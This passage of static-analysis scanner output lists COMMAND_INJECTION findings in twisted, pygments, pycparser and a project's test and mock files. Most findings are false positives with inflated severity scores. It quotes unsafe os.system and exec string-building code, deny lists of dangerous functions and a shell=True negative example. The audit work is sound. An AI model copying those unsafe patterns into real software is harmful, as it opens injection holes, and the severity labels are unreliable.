            "context": "            if not isinstance(filename, str):\n                filename = filename.encode(\"utf-8\")\n            codeobj = compile(\"1/0\", filename, \"single\")\n            eval(codeobj)\n\n        self.patch(os, \"execvpe\", execvpe)\n        self.patch(sys, \"getfilesystemencoding\", lambda: \"ascii\")",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_process.py",
            "line": 1268,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_closeNoCloexec(self) -> None:",
            "context": "        \"\"\"\n        self.assertEqual(_getFileActions([], {}, CLOSE, DUP2), [])\n\n    def test_closeNoCloexec(self) -> None:\n        \"\"\"\n        If a file descriptor is not requested but it is not close-on-exec, it\n        should be closed.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_process.py",
            "line": 1275,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_closeWithCloexec(self) -> None:",
            "context": "        \"\"\"\n        self.assertEqual(_getFileActions([(0, False)], {}, CLOSE, DUP2), [(CLOSE, 0)])\n\n    def test_closeWithCloexec(self) -> None:\n        \"\"\"\n        If a file descriptor is close-on-exec and it is not requested, no\n        action should be taken.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_process.py",
            "line": 1282,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_moveWithCloexec(self) -> None:",
            "context": "        \"\"\"\n        self.assertEqual(_getFileActions([(0, True)], {}, CLOSE, DUP2), [])\n\n    def test_moveWithCloexec(self) -> None:\n        \"\"\"\n        If a file descriptor is close-on-exec and it is moved, then there should be a dup2 but no close.\n        \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_process.py",
            "line": 1290,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_moveNoCloexec(self) -> None:",
            "context": "            _getFileActions([(0, True)], {3: 0}, CLOSE, DUP2), [(DUP2, 0, 3)]\n        )\n\n    def test_moveNoCloexec(self) -> None:\n        \"\"\"\n        If a file descriptor is not close-on-exec and it is moved, then there\n        should be a dup2 followed by a close.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_inlinecb.py",
            "line": 438,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(",
            "context": "        L{Deferred} that the C{inlineCallbacks} function returned.\n        \"\"\"\n        environ = {\"inlineCallbacks\": inlineCallbacks}\n        exec(\n            \"\"\"\n@inlineCallbacks\ndef f(d):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/test/test_flatten.py",
            "line": 365,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(",
            "context": "        from textwrap import dedent\n\n        namespace: Dict[str, FunctionType] = {}\n        exec(\n            dedent(\n                \"\"\"\n            async def coro(x):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/web/test/test_flatten.py",
            "line": 386,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(",
            "context": "        from textwrap import dedent\n\n        namespace = dict(succeed=succeed)\n        exec(\n            dedent(\n                \"\"\"\n            async def coro(x):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/insults/insults.py",
            "line": 1049,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(ch + \" = _makeSimple(ch, fName)\")",
            "context": "            (\"C\", \"Forward\"),\n            (\"D\", \"Backward\"),\n        ):\n            exec(ch + \" = _makeSimple(ch, fName)\")\n        del _makeSimple\n\n        def h(self, proto, handler, buf):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/insults/helper.py",
            "line": 152,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(execStr)",
            "context": "    ):\n        execBytes = keyID + b\" = object()\"\n        execStr = execBytes.decode(\"ascii\")\n        exec(execStr)\n\n    TAB = b\"\\t\"\n    BACKSPACE = b\"\\x7f\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_session.py",
            "line": 697,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_requestExec(self):",
            "context": "            [(b\"exit-status\", b\"\\x00\\x00\\x00\\x00\", False)],\n        )\n\n    def test_requestExec(self):\n        \"\"\"\n        When a client requests a command, the SSHSession object should get\n        the command by getting an ISession adapter for the avatar, then",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_ssh.py",
            "line": 686,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_failedExec(self):",
            "context": "        channel.addCallback(cbExited)\n        return channel\n\n    def test_failedExec(self):\n        \"\"\"\n        If L{SSHChannel.sendRequest} issues an exec which the server responds to\n        with an error, the L{Deferred} it returns fires its errback.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_ssh.py",
            "line": 724,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def cbExec(ignored):",
            "context": "\n        channel.addCallback(cbChannel)\n\n        def cbExec(ignored):\n            return self.channel.onClose\n\n        channel.addCallback(cbExec)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_ssh.py",
            "line": 752,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def cbExec(ignored):",
            "context": "\n        channel.addCallback(cbChannel)\n\n        def cbExec(ignored):\n            return defer.gatherResults(\n                [self.channel.onClose, self.realm.avatar._testSession.onClose]\n            )",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_ssh.py",
            "line": 807,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def cbExec(ignored):",
            "context": "\n        channel.addCallback(cbChannel)\n\n        def cbExec(ignored):\n            return self.channel.onClose\n\n        channel.addCallback(cbExec)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_insults.py",
            "line": 232,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(_byteGroupingTestTemplate % {\"groupName\": word, \"bytesPer\": n})",
            "context": "        (\"Quints\", 5),\n        (\"Sexes\", 6),\n    ]:\n        exec(_byteGroupingTestTemplate % {\"groupName\": word, \"bytesPer\": n})\n    del word, n\n\n    def verifyResults(self, transport, proto, parser):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_endpoints.py",
            "line": 107,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def request_exec(self, data):",
            "context": "    L{BrokenExecSession} is a session on which exec requests always fail.\n    \"\"\"\n\n    def request_exec(self, data):\n        \"\"\"\n        Fail all exec requests.\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_endpoints.py",
            "line": 125,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def request_exec(self, data):",
            "context": "    L{WorkingExecSession} is a session on which exec requests always succeed.\n    \"\"\"\n\n    def request_exec(self, data):\n        \"\"\"\n        Succeed all exec requests.\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_endpoints.py",
            "line": 144,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def request_exec(self, data):",
            "context": "    delayed indefinitely, never succeeding or failing.\n    \"\"\"\n\n    def request_exec(self, data):\n        \"\"\"\n        Delay all exec requests indefinitely.\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_conch.py",
            "line": 376,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_exec(self):",
            "context": "    data to the custom TCP server.\n    \"\"\"\n\n    def test_exec(self):\n        \"\"\"\n        Test that we can use whatever client to send the command \"echo goodbye\"\n        to the Conch server. Make sure we receive \"goodbye\" back from the",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_cftp.py",
            "line": 415,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_exec(self):",
            "context": "        # which uses features not provided by our dumb Connection fake.\n        self.client.transport = self.client.client.transport\n\n    def test_exec(self):\n        \"\"\"\n        The I{exec} command runs its arguments locally in a child process\n        using the user's shell.",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/ssh/session.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def request_exec(self, data):",
            "context": "            self.client = pp\n            return 1\n\n    def request_exec(self, data):\n        if not self.session:\n            self.session = ISession(self.avatar)\n        f, data = common.getNS(data)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/scripts/cftp.py",
            "line": 652,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(\"mkdir %s\" % path)",
            "context": "        return self.client.removeDirectory(path).addCallback(_ignore)\n\n    def cmd_LMKDIR(self, path):\n        os.system(\"mkdir %s\" % path)\n\n    def cmd_RM(self, path):\n        path, rest = self._getFilename(path)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/scripts/cftp.py",
            "line": 660,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(\"ls %s\" % rest)",
            "context": "        return self.client.removeFile(path).addCallback(_ignore)\n\n    def cmd_LLS(self, rest):\n        os.system(\"ls %s\" % rest)\n\n    def cmd_RENAME(self, rest):\n        oldpath, rest = self._getFilename(rest)",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/scripts/cftp.py",
            "line": 718,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def cmd_EXEC(self, rest):",
            "context": "        self.useProgressBar = not self.useProgressBar\n        return \"%ssing progess bar.\" % (self.useProgressBar and \"U\" or \"Not u\")\n\n    def cmd_EXEC(self, rest):\n        \"\"\"\n        Run C{rest} using the user's shell (or /bin/sh if they do not have\n        one).",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/scripts/cftp.py",
            "line": 730,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system(shell)",
            "context": "            cmds = [\"-c\", rest]\n            return utils.getProcessOutput(shell, cmds, errortoo=1)\n        else:\n            os.system(shell)\n\n    # accessory functions\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_service.py",
            "line": 58,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def testUserRetrieval(self):",
            "context": "    def testGroupCreation(self):\n        return self._entityCreationTest(\"Group\")\n\n    def testUserRetrieval(self):\n        realm = service.InMemoryWordsRealm(\"realmname\")\n\n        # Make a user to play around with",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/test/test_service.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def testGroupRetrieval(self):",
            "context": "        lookedUp = self.successResultOf(realm.lookupUser(\"testuser\"))\n        self.assertIdentical(retrieved, lookedUp)\n\n    def testGroupRetrieval(self):\n        realm = service.InMemoryWordsRealm(\"realmname\")\n\n        group = self.successResultOf(realm.createGroup(\"testgroup\"))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/xish/xpathparser.py",
            "line": 32,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "#             -e \"s/^\\(from __future\\)/exec(r'''\\n\\1/\" -e\"\\$a''')\"",
            "context": "#     imports:\n#\n#         sed -e '/^# Begin/,${/^[^ ].*mport/d}' -e 's/runtime\\.//g' \\\n#             -e \"s/^\\(from __future\\)/exec(r'''\\n\\1/\" -e\"\\$a''')\"\n#             xpathparser.py.proto > xpathparser.py\n\n\"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/xish/xpathparser.py",
            "line": 44,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(",
            "context": "These have been copied from the Yapps runtime module.\n\"\"\"\n\nexec(\n    r'''\nimport sys, re\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/formatters/__init__.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "this method is equivalent to running ``eval()`` on the input file. The formatter is",
            "context": "\n    The file is expected to contain a Formatter class named ``formattername``\n    (by default, CustomFormatter). Users should be very careful with the input, because\n    this method is equivalent to running ``eval()`` on the input file. The formatter is\n    given the `options` at its instantiation.\n\n    :exc:`pygments.util.ClassNotFound` is raised if there are any errors loading",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/formatters/__init__.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `formattername` from that namespace\n        if formattername not in custom_namespace:\n            raise ClassNotFound(f'no valid {formattername} class found in {filename}')",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/_julia_builtins.py",
            "line": 150,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v = eval(Symbol(compl.mod))",
            "context": "for compl in filter!(x -> isa(x, REPLCompletions.ModuleCompletion) && (x.parent === Base || x.parent === Core),\n                    REPLCompletions.completions(\"\", 0)[1])\n    try\n        v = eval(Symbol(compl.mod))\n        if (v isa Type || v isa TypeVar) && (compl.mod != \"=>\")\n            push!(res, compl.mod)\n        end",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/_julia_builtins.py",
            "line": 361,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v = eval(Symbol(compl.mod))",
            "context": "for compl in filter!(x -> isa(x, REPLCompletions.ModuleCompletion) && (x.parent === Base || x.parent === Core),\n                    REPLCompletions.completions(\"\", 0)[1])\n    try\n        v = eval(Symbol(compl.mod))\n        if !(v isa Function || v isa Type || v isa TypeVar || v isa Module || v isa Colon)\n            push!(res, compl.mod)\n        end",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/special.py",
            "line": 115,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "val = ast.literal_eval(val)",
            "context": "                            raise ValueError('malformed token name')\n                        ttype = getattr(ttype, ttype_)\n                    _ttype_cache[ttypestr] = ttype\n                val = ast.literal_eval(val)\n                if not isinstance(val, str):\n                    raise ValueError('expected str')\n            except (SyntaxError, ValueError):",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/foxpro.py",
            "line": 70,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r'DTOC|DTOR|DTOS|DTOT|EDITSOURCE|EMPTY|EOF|ERROR|EVAL(UATE)?|'",
            "context": "             r'DDESetService|DDESetTopic|DDETerminate|DEFAULTEXT|'\n             r'DELETED|DESCENDING|DIFFERENCE|DIRECTORY|DISKSPACE|'\n             r'DisplayPath|DMY|DODEFAULT|DOW|DRIVETYPE|DROPOFFLINE|'\n             r'DTOC|DTOR|DTOS|DTOT|EDITSOURCE|EMPTY|EOF|ERROR|EVAL(UATE)?|'\n             r'EVENTHANDLER|EVL|EXECSCRIPT|EXP|FCHSIZE|FCLOSE|FCOUNT|'\n             r'FCREATE|FDATE|FEOF|FERROR|FFLUSH|FGETS|FIELD|FILE|'\n             r'FILETOSTR|FILTER|FKLABEL|FKMAX|FLDLIST|FLOCK|FLOOR|'",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/__init__.py",
            "line": 154,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `lexername` from that namespace\n        if lexername not in custom_namespace:\n            raise ClassNotFound(f'no valid {lexername} class found in {filename}')",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pygments/lexers/installers.py",
            "line": 66,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r'EnableWindow|EnumReg(?:Key|Value)|Exch|Exec(?:Shell|Wait)?|'",
            "context": "             r'Create(?:Directory|Font|Shortcut)|Delete(?:INI(?:Sec|Str)|'\n             r'Reg(?:Key|Value))?|DetailPrint|DetailsButtonText|'\n             r'Dir(?:Show|Text|Var|Verify)|(?:Disabled|Enabled)Bitmap|'\n             r'EnableWindow|EnumReg(?:Key|Value)|Exch|Exec(?:Shell|Wait)?|'\n             r'ExpandEnvStrings|File(?:BufSize|Close|ErrorText|Open|'\n             r'Read(?:Byte)?|Seek|Write(?:Byte)?)?|'\n             r'Find(?:Close|First|Next|Window)|FlushINI|Function(?:End)?|'",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pycparser/ply/cpp.py",
            "line": 600,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = eval(expr)",
            "context": "        expr = expr.replace(\"||\",\" or \")\n        expr = expr.replace(\"!\",\" not \")\n        try:\n            result = eval(expr)\n        except Exception:\n            self.error(self.source,tokens[0].lineno,\"Couldn't evaluate expression\")\n            result = 0",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pycparser/ply/yacc.py",
            "line": 1562,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "c = eval(s)",
            "context": "        for n, s in enumerate(syms):\n            if s[0] in \"'\\\"\":\n                try:\n                    c = eval(s)\n                    if (len(c) > 1):\n                        raise GrammarError('%s:%d: Literal token %s in rule %r may only be a single character' %\n                                           (file, line, s, prodname))",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pycparser/ply/yacc.py",
            "line": 1982,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('import %s' % module)",
            "context": "        if isinstance(module, types.ModuleType):\n            parsetab = module\n        else:\n            exec('import %s' % module)\n            parsetab = sys.modules[module]\n\n        if parsetab._tabversion != __tabversion__:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pycparser/ply/yacc.py",
            "line": 3254,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('import %s' % pkgname)",
            "context": "            else:\n                parts = tabmodule.split('.')\n                pkgname = '.'.join(parts[:-1])\n                exec('import %s' % pkgname)\n                srcfile = getattr(sys.modules[pkgname], '__file__', '')\n        outputdir = os.path.dirname(srcfile)\n",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pycparser/ply/lex.py",
            "line": 215,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('import %s' % tabfile)",
            "context": "        if isinstance(tabfile, types.ModuleType):\n            lextab = tabfile\n        else:\n            exec('import %s' % tabfile)\n            lextab = sys.modules[tabfile]\n\n        if getattr(lextab, '_tabversion', '0.0') != __tabversion__:",
            "cvss_score": 7.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pycparser/ply/lex.py",
            "line": 1039,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('import %s' % pkgname)",
            "context": "                else:\n                    parts = lextab.split('.')\n                    pkgname = '.'.join(parts[:-1])\n                    exec('import %s' % pkgname)\n                    srcfile = getattr(sys.modules[pkgname], '__file__', '')\n            outputdir = os.path.dirname(srcfile)\n        try:",
            "cvss_score": 7.5
          },
          {
            "file": "tests/framework/test_orchestrator.py",
            "line": 173,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Run cargo test with JSON output\n            process = await asyncio.create_subprocess_exec(\n                'cargo', 'test', '--manifest-path', 'rust_core/Cargo.toml', '--', '--format', 'json',\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "tests/framework/test_orchestrator.py",
            "line": 225,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Run pytest with JSON output\n            process = await asyncio.create_subprocess_exec(\n                'python', '-m', 'pytest', 'tests/unit/', '--json-report', '--json-report-file=/tmp/pytest_report.json',\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "tests/framework/test_orchestrator.py",
            "line": 302,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Run Rust benchmarks\n            process = await asyncio.create_subprocess_exec(\n                'cargo', 'bench', '--manifest-path', 'rust_core/Cargo.toml',\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE",
            "cvss_score": 7.5
          },
          {
            "file": "tests/framework/hardware_optimized_orchestrator.py",
            "line": 153,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "            \n        # Run tests with resource monitoring\n        metrics_log = []\n        process = await asyncio.create_subprocess_exec(\n            *pytest_args,\n            env=env,\n            stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "tests/framework/test_automation.py",
            "line": 490,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        start_time = time.time()\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                'cargo', 'test', '--manifest-path', 'rust_core/Cargo.toml',\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "tests/framework/test_automation.py",
            "line": 521,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        start_time = time.time()\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                'python', '-m', 'pytest', 'tests/unit/', '-v', '--json-report', '--json-report-file=/tmp/pytest_report.json',\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "tests/framework/test_automation.py",
            "line": 609,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Run Rust benchmarks\n            process = await asyncio.create_subprocess_exec(\n                'cargo', 'bench', '--manifest-path', 'rust_core/Cargo.toml',\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "tests/framework/test_automation.py",
            "line": 641,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Run bandit for Python security analysis\n            process = await asyncio.create_subprocess_exec(\n                'bandit', '-r', 'src/', '-f', 'json', '-o', '/tmp/bandit_report.json',\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "tests/framework/test_automation.py",
            "line": 680,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        start_time = time.time()\n        \n        try:\n            process = await asyncio.create_subprocess_exec(\n                'python', '-m', 'pytest', 'tests/e2e/', '-v',\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "tests/utils/helpers.py",
            "line": 392,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "    capture_output: bool = True\n) -> Dict[str, Any]:\n    \"\"\"Run a subprocess asynchronously.\"\"\"\n    process = await asyncio.create_subprocess_exec(\n        *command,\n        stdout=asyncio.subprocess.PIPE if capture_output else None,\n        stderr=asyncio.subprocess.PIPE if capture_output else None",
            "cvss_score": 7.5
          },
          {
            "file": "tests/mocks/mcp_server_mocks.py",
            "line": 825,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if any(dangerous in query for dangerous in [\"file(\", \"exec(\", \"system(\"]):",
            "context": "        query_time = params.get(\"time\", str(int(time.time())))\n        \n        # Basic PromQL validation\n        if any(dangerous in query for dangerous in [\"file(\", \"exec(\", \"system(\"]):\n            raise Exception(\"Dangerous PromQL function detected\")\n        \n        # Mock metrics based on query",
            "cvss_score": 9.8
          },
          {
            "file": "tests/security/security_testing_framework.py",
            "line": 495,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "                \"-f\", \"json\", \"-o\", \"/tmp/bandit_report.json\"\n            ]\n            \n            process = await asyncio.create_subprocess_exec(\n                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE\n            )\n            stdout, stderr = await process.communicate()",
            "cvss_score": 7.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 294,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# subprocess.run(f\"echo {dangerous_input}\", shell=True)",
            "context": "            # Should not use shell=True with user input\n            with pytest.raises(ValueError):\n                # This is what we're protecting against\n                # subprocess.run(f\"echo {dangerous_input}\", shell=True)\n                pass\n                \n    def test_xxe_prevention(self):",
            "cvss_score": 7.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 207,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if any(dangerous in query for dangerous in ['file(', 'exec(', 'eval(']):",
            "context": "            raise MCPException(\"Query is required\")\n        \n        # Basic PromQL validation\n        if any(dangerous in query for dangerous in ['file(', 'exec(', 'eval(']):\n            raise MCPException(\"Dangerous PromQL functions not allowed\")\n        \n        return {",
            "cvss_score": 7.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 207,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if any(dangerous in query for dangerous in ['file(', 'exec(', 'eval(']):",
            "context": "            raise MCPException(\"Query is required\")\n        \n        # Basic PromQL validation\n        if any(dangerous in query for dangerous in ['file(', 'exec(', 'eval(']):\n            raise MCPException(\"Dangerous PromQL functions not allowed\")\n        \n        return {",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/devops_servers.py",
            "line": 914,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.exec with explicit arguments (no shell=True)",
            "context": "            ]\n        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/devops_servers.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
            "context": "        \n        try:\n            # Use subprocess.exec with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *cmd_parts,\n                stdout=asyncio.subprocess.PIPE,\n                stderr=asyncio.subprocess.PIPE,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 419,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "# Use subprocess.run with explicit arguments (no shell=True)",
            "context": "        logger.info(f\"Executing validated command: {base_command} in {work_dir}\")\n        \n        try:\n            # Use subprocess.run with explicit arguments (no shell=True)\n            process = await asyncio.create_subprocess_exec(\n                *parts,  # Unpack the safely parsed command parts\n                cwd=work_dir,",
            "cvss_score": 7.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/infrastructure_servers.py",
            "line": 420,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "process = await asyncio.create_subprocess_exec(",
